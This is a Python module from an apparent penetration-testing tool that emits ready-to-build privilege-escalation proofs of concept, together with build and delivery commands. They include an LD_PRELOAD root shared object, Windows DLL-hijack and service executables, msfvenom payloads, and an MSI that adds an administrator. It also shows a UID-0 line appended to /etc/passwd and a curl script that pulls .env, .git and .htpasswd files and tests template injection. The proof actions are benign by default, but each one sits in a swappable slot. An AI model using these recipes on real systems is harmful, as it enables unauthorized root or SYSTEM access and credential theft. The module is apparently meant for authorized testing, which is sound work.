"""Benign proof-of-concept build recipes.

"Drop a payload here" isn't actionable without the payload. For a CONFIRMED
finding this emits the EXACT source + build command + delivery for the standard,
documented PoC artifact - deliberately BENIGN: the default action just proves
execution (runs `id`/`whoami` into a marker file, or adds a clearly-named
throwaway account), which is exactly what a write-up needs. Swap the single
ACTION line for your ROE-approved command.

Everything is a published technique built with tools Kali ships (gcc, mingw,
msfvenom). Nothing here is obfuscated or AV-evasive: these are plain proofs. If a
security control blocks a plain PoC, coordinate an exclusion for the test window
(the ROE path) rather than engineering evasion - recce does not do that.
"""

from __future__ import annotations

import os
import re

MARKER = "recce_poc"        # marker file / throwaway account name used by the proofs


# --- payload sources (benign proof actions) -------------------------------------

def _c_ld_preload() -> str:
    return (
        "/* recce PoC - LD_PRELOAD / writable-.so / env-injection escalation.\n"
        " * BENIGN: elevates, then writes proof to /tmp/recce_poc.txt.\n"
        " * Swap the system() line for your ROE-approved action.\n"
        " * build: gcc -fPIC -shared -nostartfiles -o /tmp/recce_poc.so recce_poc_preload.c */\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "void _init(void) {\n"
        "    setgid(0); setuid(0);\n"
        "    system(\"id > /tmp/recce_poc.txt 2>&1\");\n"
        "}\n")


def _sh_root_job() -> str:
    return (
        "#!/bin/sh\n"
        "# recce PoC - runs when a root job (cron / service / PATH-hijacked command) fires.\n"
        "# BENIGN: proves root execution. Swap for your ROE action.\n"
        "id > /tmp/recce_poc.txt 2>&1\n")


def _c_win_dll() -> str:
    return (
        "/* recce PoC DLL - proves a hijacked DLL loaded in the target process.\n"
        " * BENIGN: writes whoami to C:\\recce_poc.txt. Swap for your ROE action.\n"
        " * A real hijack should PROXY the legit exports so the app keeps working.\n"
        " * build: x86_64-w64-mingw32-gcc recce_poc_dll.c -shared -o evil.dll */\n"
        "#include <windows.h>\n"
        "#include <stdlib.h>\n"
        "BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {\n"
        "    if (reason == DLL_PROCESS_ATTACH) {\n"
        "        system(\"cmd /c whoami > C:\\\\recce_poc.txt\");\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n")


def _sh_web() -> str:
    return (
        "#!/bin/sh\n"
        "# recce web PoC - proves a web exposure / dangerous-method finding. BENIGN.\n"
        "# usage: sh recce_poc_web.sh http://TARGET:PORT\n"
        "U=\"${1:?usage: recce_poc_web.sh http://target:port}\"\n"
        "echo \"[*] exposed .git/HEAD:\"; curl -sk \"$U/.git/HEAD\"\n"
        "echo \"[*] exposed .env:\";     curl -sk \"$U/.env\" | head -3\n"
        "echo \"[*] server-status:\";    curl -sk \"$U/server-status\" | head -3\n"
        "echo \"[*] actuator/env:\";     curl -sk \"$U/actuator/env\" | head -3\n"
        "echo \"[*] prometheus:\";       curl -sk \"$U/metrics\" | head -3\n"
        "echo \"[*] .htpasswd:\";        curl -sk \"$U/.htpasswd\"\n"
        "echo \"[*] crossdomain:\";      curl -sk \"$U/crossdomain.xml\"\n"
        "echo \"[*] graphql introspection:\"; curl -sk -X POST -H 'Content-Type: application/json' "
        "-d '{\"query\":\"{__schema{queryType{name}}}\"}' \"$U/graphql\" | head -c 200; echo\n"
        "echo \"[*] CORS reflect:\";     curl -skI -H 'Origin: https://recce.example' \"$U/\" | grep -i '^access-control-'\n"
        "echo \"[*] SSTI (expect 49):\"; curl -sk \"$U/?rc=recceA%7B%7B7*7%7D%7D\" | grep -o 'recceA49'\n"
        "echo \"[*] allowed methods:\";  curl -skI -X OPTIONS \"$U/\" | grep -i '^allow:'\n"
        "# JWT: decode with  jwt_tool <token> ;  forge alg=none with  jwt_tool <token> -X a\n"
        "echo \"[*] PUT test (writes a marker if enabled):\"\n"
        "curl -sk -X PUT \"$U/recce_poc.txt\" -d 'recce_poc'; curl -sk \"$U/recce_poc.txt\"; echo\n"
        "# For a confirmed .git:  git-dumper \"$U/.git\" ./loot\n")


def _c_win_exe() -> str:
    return (
        "/* recce PoC exe - proves execution as the service / intercept account.\n"
        " * BENIGN: writes whoami to C:\\recce_poc.txt. Swap for your ROE action.\n"
        " * For a REAL Windows service use  msfvenom -f exe-service  (it does the SCM\n"
        " * handshake so SCM doesn't kill it); this plain exe suits unquoted-path,\n"
        " * writable-binary and autorun intercepts that just launch a process.\n"
        " * build: x86_64-w64-mingw32-gcc recce_poc_exe.c -o payload.exe */\n"
        "#include <stdlib.h>\n"
        "int main(void) {\n"
        "    system(\"cmd /c whoami > C:\\\\recce_poc.txt\");\n"
        "    return 0;\n"
        "}\n")


# --- recipe registry ------------------------------------------------------------
# files : {filename: source}   build : [shell build commands]
# deliver: how to place/trigger it   proof: how to confirm it fired

RECIPES: dict[str, dict] = {
    "ld_preload": {
        "name": "LD_PRELOAD / writable-.so / SUID env-injection -> root",
        "files": {"recce_poc_preload.c": _c_ld_preload()},
        "build": ["gcc -fPIC -shared -nostartfiles -o /tmp/recce_poc.so recce_poc_preload.c"],
        "deliver": "sudo LD_PRELOAD=/tmp/recce_poc.so <allowed-sudo-cmd>   "
                   "(or: echo /tmp/recce_poc.so >> /etc/ld.so.preload  then invoke any SUID, e.g. ping)",
        "proof": "cat /tmp/recce_poc.txt   -> uid=0(root)",
    },
    "linux_root_job": {
        "name": "Writable cron / service / PATH-hijack -> root",
        "files": {"recce_poc_root.sh": _sh_root_job()},
        "build": ["chmod +x recce_poc_root.sh"],
        "deliver": "point the writable job at recce_poc_root.sh (or name it as the hijacked command in the "
                   "writable PATH dir); wait for the root job/cron to run it.",
        "proof": "cat /tmp/recce_poc.txt   -> uid=0(root)",
    },
    "linux_passwd": {
        "name": "Writable /etc/passwd -> add a UID-0 account",
        "files": {},
        "build": ["openssl passwd -6 'Recce!Poc123'      # copy the hash into the line below"],
        "deliver": "echo 'recce_poc:<hash-from-above>:0:0::/root:/bin/bash' >> /etc/passwd",
        "proof": "su recce_poc  (password Recce!Poc123)  -> id shows uid=0.  REMOVE the line afterwards.",
    },
    "win_service_exe": {
        "name": "Unquoted path / writable service binary / autorun -> SYSTEM",
        "files": {"recce_poc_exe.c": _c_win_exe()},
        "build": [
            'msfvenom -p windows/x64/exec CMD="cmd /c whoami > C:\\recce_poc.txt" -f exe-service -o payload.exe'
            "   # real services (does the SCM handshake)",
            "x86_64-w64-mingw32-gcc recce_poc_exe.c -o payload.exe"
            "   # plain exe for unquoted-path / autorun / writable-binary intercepts",
        ],
        "deliver": "copy payload.exe to the exact plant/overwrite path recce named; "
                   "sc stop <svc> & sc start <svc>  (or wait for the trigger).",
        "proof": "type C:\\recce_poc.txt   -> nt authority\\system",
    },
    "win_dll": {
        "name": "DLL hijack -> code exec in the target (often SYSTEM) process",
        "files": {"recce_poc_dll.c": _c_win_dll()},
        "build": [
            'msfvenom -p windows/x64/exec CMD="cmd /c whoami > C:\\recce_poc.txt" -f dll -o evil.dll',
            "x86_64-w64-mingw32-gcc recce_poc_dll.c -shared -o evil.dll"
            "   # proxy the real exports so the host app keeps working",
        ],
        "deliver": "rename evil.dll to the missing/hijacked DLL recce identified; place it in the writable "
                   "dir; start/restart the target exe/service.",
        "proof": "type C:\\recce_poc.txt   -> the target process's context",
    },
    "web": {
        "name": "Web exposure / dangerous method -> proof requests",
        "files": {"recce_poc_web.sh": _sh_web()},
        "build": ["chmod +x recce_poc_web.sh"],
        "deliver": "sh recce_poc_web.sh http://<target>:<port>",
        "proof": "the fetched .git/.env/actuator content, or the PUT marker echoed back.",
    },
    "win_msi": {
        "name": "AlwaysInstallElevated -> SYSTEM via MSI",
        "files": {},
        "build": ['msfvenom -p windows/x64/exec CMD="net localgroup administrators recce_poc /add" '
                  "-f msi -o recce_poc.msi"],
        "deliver": "msiexec /quiet /qn /i recce_poc.msi",
        "proof": "net localgroup administrators  -> lists recce_poc.  REMOVE it afterwards "
                 "(net localgroup administrators recce_poc /del).",
    },
}


_MATCH = [
    (r"ld_preload|ld\.so\.preload|env-injection|env_keep.*ld_|writable (shared-)?librar|\.so hijack",
     "ld_preload"),
    (r"/etc/passwd is writable|writable /etc/passwd", "linux_passwd"),
    (r"path-hijack|path hijack|writable cron|writable .*timer|writable service unit|runs a writable binary|"
     r"writable root|writable library dir", "linux_root_job"),
    (r"alwaysinstallelevated", "win_msi"),
    (r"exposed (git|\.git|\.env|svn|\.ds_store|aws)|\.env file|mod_status exposed|"
     r"mod_info exposed|actuator|phpinfo|directory listing enabled|dangerous http methods|"
     r"web\.config readable|crossdomain|prometheus /metrics|\.htpasswd|graphql introspection|"
     r"cors reflects|server-side template injection|jwt (accepts|uses)|secret in client-side js|"
     r"backup/source file", "web"),
    (r"unquoted service|writable service binary|writable autorun|writable scheduled-task|"
     r"writable service registry", "win_service_exe"),
    (r"dll hijack|writable directory in (system|user) path|writable app dir|com inprocserver|com hijack|"
     r"service binary directory is writable", "win_dll"),
]
_MATCH_C = [(re.compile(p, re.I), k) for p, k in _MATCH]


def recipe_key_for(text: str) -> str | None:
    for rx, k in _MATCH_C:
        if rx.search(text or ""):
            return k
    return None


def select_for_host(host) -> dict[str, dict]:
    """The applicable PoC recipes for a host's CONFIRMED findings, keyed by id."""
    keys: list[str] = []
    texts: list[str] = []
    for v in getattr(host, "vulns", []) or []:
        if getattr(v, "confidence", "") != "potential":
            texts.append(f"{v.title} {v.output}")
    for f in getattr(host, "local_findings", []) or []:
        texts.append(f.get("vector", ""))
    for t in texts:
        k = recipe_key_for(t)
        if k and k not in keys:
            keys.append(k)
    return {k: RECIPES[k] for k in keys}


def write_files(poc_dir: str, recipes: dict, written: set | None = None) -> list[str]:
    """Write each recipe's source files into poc_dir (deduped via `written`).
    Returns the list of file paths written this call."""
    os.makedirs(poc_dir, exist_ok=True)
    written = written if written is not None else set()
    out: list[str] = []
    for r in recipes.values():
        for fname, content in r.get("files", {}).items():
            if fname in written:
                continue
            written.add(fname)
            path = os.path.join(poc_dir, fname)
            with open(path, "w") as fh:
                fh.write(content)
            out.append(path)
    return out


def plan_lines(recipes: dict) -> list[str]:
    """Commented reference block (build -> deliver -> proof) for a host script."""
    if not recipes:
        return []
    lines = [
        "# ======================================================",
        "# PoC BUILD RECIPES (benign proofs - swap the ACTION for your ROE command)",
        "# Source files are in ./poc/ ; nothing here is obfuscated or AV-evasive.",
        "# ======================================================",
    ]
    for r in recipes.values():
        lines.append(f"#   {r['name']}")
        for f in r.get("files", {}):
            lines.append(f"#     source : poc/{f}")
        for b in r["build"]:
            lines.append(f"#     build  : {b}")
        lines.append(f"#     deliver: {r['deliver']}")
        lines.append(f"#     proof  : {r['proof']}")
        lines.append("#")
    return lines
